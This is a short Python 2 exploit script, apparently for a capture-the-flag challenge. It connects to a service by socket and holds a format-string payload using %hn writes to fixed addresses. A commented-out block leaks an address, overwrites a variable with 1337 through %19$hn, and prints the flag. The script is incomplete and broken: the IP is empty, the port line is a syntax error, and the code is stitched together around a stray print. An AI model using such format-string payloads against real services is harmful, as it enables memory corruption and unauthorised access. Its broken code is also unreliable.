#!/usr/bin/python
# -*- coding:utf-8 -*-

import socket, time, struct

def sock(remoteip, remoteport):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((remoteip, remoteport))
	return s

def recv_time(s):
	time.sleep(0.1)
	return s.recv(1024)

def recv_time_split(s):
	time.sleep(0.1)
	m = (s.recv(1024)).split(" ")
	m = m[4].split("\n")
	return m[0]

def send_print(s, d):
	print "[*]send :", d + "\\n"
	s.send(d + "\n")

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]

if __name__ == "__main__":
	ip = ""
	port = 

	s = sock(ip, port)
	print "[*]connect :", ip + ":" + str(port)

	msg = recv_time(s)
	print msg

print '\x18\xa0\x04\x08\x1a\xa0\x04\x08%34105x%7$hn%33475x%8$hn'
"""
	msg = recv_time_split(s)
	print "-----------------------------------------"
	print "[+]addr_x :", msg
	print "-----------------------------------------\n"

	addr_x = p(int(msg, 16))

	x = 1337
	diff_x = "%" + str(x - 4) + "x"

	fs = "%19$hn"

	send_data = ""
	send_data += addr_x
	send_data += diff_x
	send_data += fs

	send_print(s, send_data)

	msg = recv_time(s)
	msg = msg.split("\n")
	print "-----------------------------------------"
	print "[+]flag :", msg[2]
	print "-----------------------------------------\n"
"""
